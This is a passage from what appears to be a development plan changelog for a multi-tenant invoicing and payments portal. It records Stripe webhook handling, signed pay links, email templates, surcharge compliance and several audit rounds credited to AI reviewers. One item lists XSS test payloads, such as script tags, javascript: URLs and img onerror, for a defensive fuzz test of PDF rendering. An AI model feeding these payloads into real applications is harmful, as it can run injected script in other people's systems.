tokens), `X-Frame-Options: DENY` (prevents iframe-overlay phishing). Five RISK mitigations: **R1** — webhook routing gains `charge.refunded` (sets `status: 'refunded'` or `'partially-refunded'`, records `refundedAmountCents`), `charge.dispute.created` (sets `disputed: true`, `disputeReason`, notifies tenant with evidence deadline), and `charge.dispute.closed` (routes to `refunded` on loss, clears `disputed` flag on win). Invoice schema gains `stripeChargeId`, `refundedAt`, `refundedAmountCents`, `disputed`, `disputedAt`, `disputeReason`, `disputeOutcome` fields; `status` enum gains `'refunded'` and `'partially-refunded'`. **R2** — `payAttempts` subcollection gets an `expireAt` field and a Firestore TTL policy (48h) for auto-cleanup; prevents orphan-doc accumulation at scale. **R3** — `middleware.ts` gains a `config.matcher` that excludes `_next/static`, `_next/image`, `favicon.ico`, `robots.txt`, `sitemap.xml`, `/api/*`, and any path with a file extension; without the matcher, custom-domain requests trigger a Firestore read per static asset (≈20× amplification per page view at 50+ tenants). **R4** — `functions/emails/sanitize.ts` utility strips control characters (CR/LF for header injection, NUL, other non-tab C0 bytes), collapses whitespace, and length-caps tenant-controlled strings (`name` 100, `address` 300, `emailFooter` 500, `replyTo` 200 with separate email-format validation); enforced at `emails/send.ts` boundary; hard convention of no `dangerouslySetInnerHTML` anywhere in `functions/emails/`. **R5** — Payment Settings "live preview" row rewritten to show the honest 3-line breakdown (customer pays / Stripe fee / tenant net) so tenants aren't surprised by the residual 0.5% + 30¢ that surcharging can't recover; e-transfer shown alongside for comparison. Three POLISH refinements: **P1+P4** — `verifyInvoicePayToken` now returns a discriminated-union `VerifyResult` (`ok | paid | refunded | regenerated | not-available`) instead of throwing `HttpsError` on legitimate render states; pay page branches on `outcome`; success-page polling no longer string-matches on error messages; a `PAYABLE_STATUSES` allow-list (`sent | unpaid | overdue | partial`) blocks draft or archived invoices from being payable even if a tenant accidentally shared a pay link for one. **P2** — each email template now exports a `buildPreviewText(props)` function returning 80–110 char inbox-scanning copy (spec'd for InvoiceSent, PaymentReceipt, MagicLinkSignIn, StaffInvite, QuoteSent, RecurringInvoiceSent); passed to `<TenantEmailLayout>` as the `preview` prop. **P3** — formally documented that JWT `exp` claim is the **authoritative** expiry for pay tokens; the Firestore `payTokenExpiresAt` field is display-only (used for dashboard "expires in N days" copy and `regenerateInvoicePayLink` CTAs). **Total impact:** ~340 lines added across Phase 1 (schema), Phase 2 (callables + webhook), Phase 3 (pay-route layout), Phase 4 (Stripe webhook + surcharge metadata), Phase 5 (payment settings preview + middleware config). No existing decisions reversed. Round 4 findings treated as one comprehensive pass rather than split across phases because the items are tightly interlocking (C2 stamps metadata that the webhook R1 extension reads; P1 return shape is consumed by C3-protected pay route). **Audit cycle now closed** — future audits should wait for actual Phase 1 code, not more plan revisions.

12. **Pre-Phase-1 decisions locked 2026-04-13** (Opus 4.6 + Gemini joint). **Decision #1 — Vercel project layout:** Option A, single project for marketing + portal + pay pages with middleware-based host routing. Rejected the plan's original Option B recommendation (separate projects) — middleware cost is small, single project keeps CI/CD and shared utilities (brand contrast, tenant resolver) in one place, early-return in middleware for known marketing hostnames mitigates per-request overhead. **Decision #2 — Transactional email provider:** Resend. Chosen over Zoho to avoid multi-tenant reputation risk, and chosen over Postmark for the native React Email pairing — templates become JSX components sharing the Phase 1.5 design tokens, so visual parity between emails and the portal is enforced at the component level. Free tier (3k/month) covers MVP. Phase 1 execution is now unblocked.

11. **Payment flow, email system, and portal metadata added 2026-04-13** (Opus 4.6 + Sonnet 4.6 + Gemini joint review — batch edit after Phase 1.5 landed). Five cross-phase additions touching Phase 1, 2, 3, 4, 5, and 6: **(a) Invoice pay-link flow** — signed JWT `payToken` + `payTokenExpiresAt` + `payTokenVersion` fields added to invoice docs (Phase 1); `verifyInvoicePayToken` and `createPayTokenCheckoutSession` callables added to function inventory (Phase 2); public `(pay)/pay/[token]/page.tsx` route added with success/cancelled redirect targets (Phase 3); token-authenticated Checkout with rate limit (10 sessions/invoice/24h) and `PAY_TOKEN_SECRET` via `defineSecret()` (Phase 4); `regenerateInvoicePayLink` callable for owner/admin invalidation. Kills the 4-click magic-link-to-pay friction — customers now go email → pay page → done. **(b) React Email + Resend transactional email system** — `functions/emails/` package with `<TenantEmailLayout>` shared shell (max-logo 200×60px, color-scheme meta tags for dark-mode inversion prevention), 6 templates (InvoiceSent, PaymentReceipt, MagicLinkSignIn, StaffInvite, QuoteSent, RecurringInvoiceSent), 9 design principles enforced (single-column 600px, one CTA, system fonts only, tenant primaryColor on CTA button only with `computeForeground()` contrast guard from Phase 1.5, platform-domain From + tenant-email Reply-To, plain-text fallback, no unsubscribe on transactional, no multi-column, no web fonts). Eliminates the email-side equivalent of the old Vite app's dual `cs-toast`/`inv-toast` pattern. **(c) Portal + pay-page metadata injection** — `generateMetadata()` in `(portal)/layout.tsx` and `(pay)/pay/[token]/layout.tsx` reads `meta.faviconUrl` and `meta.name` via Admin SDK (Firestore rules block unauthenticated meta reads, same pattern as branded login page) so browser tab shows tenant favicon + name on custom domains; Open Graph images for social-share rendering of pay links; explicit `runtime: 'nodejs'` to prevent Vercel Edge auto-optimization breaking Admin SDK. **(d) E-Transfer as primary payment method** — `meta.etransferEmail` field added (Phase 1); pay page lists e-transfer first with copy-details button and $3k bank-limit tooltip, credit card second with surcharge disclosure; PDF includes both methods with QR code for credit card (self-contained via `qrcode` npm package — no external image fetch at render); dashboard warns tenant if sending without e-transfer configured; `createInvoice` blocks send if BOTH e-transfer AND Stripe Connect are unconfigured. **(e) Credit card surcharge toggle with Canadian compliance** — `chargeCustomerCardFees` boolean + `cardFeePercent` (default 2.4, HARD-CAPPED server-side at 2.4 — the Visa/Mastercard Canadian ceiling) + `surchargeAcknowledgedAt` timestamp added to meta (Phase 1); `updatePaymentSettings` callable refuses to enable surcharging without acknowledgment (defensive — can't bypass UI by calling API directly); `/settings/payments` sub-page with toggle + percentage input + live preview + one-time acknowledgment modal covering 30-day Visa/Mastercard notification requirement, Quebec exclusion (Consumer Protection Act), debit-card exclusion, 2.4% cap, and automatic disclosure; Checkout line-item pattern that adds the surcharge as a separate item (not rolled into invoice total — preserves accounting clarity); webhook reconciliation stores `paidAmountCents` + `surchargeAmountCents` split on the invoice doc; PDF receipt shows surcharge as separate line when paid by card. MVP limitations documented: Quebec geo-exclusion is contractual (tenant acknowledgment) not auto-enforced; debit-vs-credit distinction limited by Stripe Checkout — acceptable MVP risk. **Total added:** ~520 lines across 6 phases, one shared secret (`PAY_TOKEN_SECRET`), 5 new callables, 1 new route group, 6 new email templates, 1 new settings sub-page. No existing content modified except field additions to tenant meta and invoice doc schemas. Estimated incremental effort 2–2.5 days across the phases.

14. **Deep audit round 5 applied 2026-04-14** (Gemini + Opus 4.6 joint synthesis — final logical-gap pass before Phase 1 code begins, plus doc-boundary cleanup between `REBUILD_PLAN.md` and `REBUILD_PLAN_DEFERRED.md`). Seven fixes applied directly to the main plan, all landing in the phases they affect rather than being parked in the deferred audit trail: **(1) Stripe account state schema** — `meta.stripeStatus` object added to Phase 1 (`chargesEnabled`, `payoutsEnabled`, `detailsSubmitted`, `currentlyDue[]`, `disabledReason`, `updatedAt`); `onSignup` batch seeds all-`false` defaults; Phase 4 `account.updated` webhook is the sole writer; `createInvoice` refuses to send if `stripeStatus.chargesEnabled === false` AND no `etransferEmail` configured. Closes the "Stripe Express restricted-account silent failure" risk — tenants can no longer send pay-enabled invoices that Stripe will reject at checkout. Replaces R1 breadcrumb in DEFERRED. **(2) `userTenantMemberships/{uid}_{tenantId}` collection promoted from deferred P7 to Phase 1 schema** — `users/{uid}` narrowed to `{primaryTenantId, email}`; new membership docs (`{uid, tenantId, role, invitedBy, createdAt, deletedAt}`) written in both `onSignup` batch and `onAcceptInvite` callable so multi-tenant membership is a UI problem post-MVP, not a migration. MVP still rejects second-tenant joins at the rule layer; schema just stops fighting the inevitable. **(3) Auth recovery flow** — `/forgot-password/page.tsx` and `/auth/action/page.tsx` added to the Phase 3 route tree under `(auth)/`; dedicated "Auth recovery flow" subsection covers `sendPasswordResetEmail`, Firebase action-code dispatch by `mode` (`resetPassword` → `confirmPasswordReset`, `verifyEmail` → `applyActionCode`, `recoverEmail` → `checkActionCode`+`applyActionCode`), email-verification gate on dashboard layout, Firebase console email-template configuration (branded sender name, custom action URL pointing at `/auth/action`), authorized-domains list including every custom domain, and explicit MVP deferral of 2FA. Replaces R2 breadcrumb in DEFERRED. **(4) Vercel Edge Config caching for custom-domain lookups** — Phase 5 middleware gains a "Cache the domain lookup" subsection: the domain-verification Cloud Function writes `{[domain]: tenantId}` to Edge Config as the 4th atomic step (alongside `meta.customDomain`, `customDomains/{domain}`, and DNS verification marker); middleware reads via `@vercel/edge-config` for sub-50ms edge lookups; miss path falls back to Firestore and repopulates the cache. Promoted from the deferred R6 "middleware init pattern" fix because Edge Config solves both the cold-start cost AND the cross-request caching problem in one mechanism. **(5) Custom-domain verification state surfaced in `/settings/domain`** — `meta.customDomainStatus` object (`stage: 'pending-dns' | 'pending-ssl' | 'verified' | 'error'`, `message`, `checkedAt`) added to Phase 1; Phase 5 gains a state-machine walkthrough, scheduled re-check Cloud Function, and UI banner showing the current stage so tenants aren't staring at a silent failure for hours. **(6) XSS-to-PDF escape rules in Phase 6** — highest-severity finding of the round. New "⚠️ XSS-to-PDF" subsection mandates: auto-escaping template engine (Handlebars `{{}}` not `{{{}}}`, or React Email–style JSX); every user-controlled string (invoice line items, customer name/address, tenant name/address/emailFooter, notes) escaped at render; `logoUrl` validated as `https://` before template interpolation; CSP header `default-src 'none'; img-src data: https:;` on the render HTML; Phase 7 fuzz test feeding `<script>`, `javascript:`, `<img onerror>`, and `"><svg>` payloads into every field and asserting the rendered PDF contains no executed script and no broken layout. Puppeteer is a full Chromium — an unescaped `</style><script>` in a customer name means arbitrary JS runs in the render context. Not theoretical. **(7) Immutable logo snapshot via base64 data URL** — Phase 6 gains "Immutable logo snapshot" subsection with Option A (recommended: base64-encode `meta.logoUrl` at invoice creation, store on the invoice doc as `logo` data URL, 500KB cap, frozen legal document semantics) vs Option B (immutable Storage path, e.g. `tenants/{id}/logos/{invoiceId}.png` copied at create time). `createInvoice` helper `inlineLogoOrThrow(meta.logoUrl)` enforces the cap and throws a user-visible error if exceeded. Fixes the "tenant changes logo → old PDFs now show new logo" timeline-mutation bug. Replaces P1 breadcrumb in DEFERRED. **(8) Doc-boundary cleanup** — `REBUILD_PLAN_DEFERRED.md` was drifting toward re-documenting schemas and routes (duplication = drift). R1, R2, and P7 narratives replaced with ~3-line breadcrumbs pointing to the phases where they now live; "Recommended action order" updated to reflect R1/R2 folded, R6 "largely obsolete" (Edge Config subsumed the concern), P1 "partially obsolete" (base64 logo inlining subsumed the render-time null check); "Audit confidence summary" remaining totals recounted to 6 RISK (R3–R8) + 13 POLISH (P1–P6, P8–P14). DEFERRED is now strictly rationale/audit-trail; implementation details live in `REBUILD_PLAN.md` alone. **Total impact:** ~200 lines added to the main plan; ~180 lines trimmed from DEFERRED. No existing decisions reversed. Highest-severity single finding was #6 (XSS-to-PDF); highest structural finding was #8 (doc boundary). **Audit cycle is now definitively closed — next stop is Phase 1 code, no more plan revisions.**
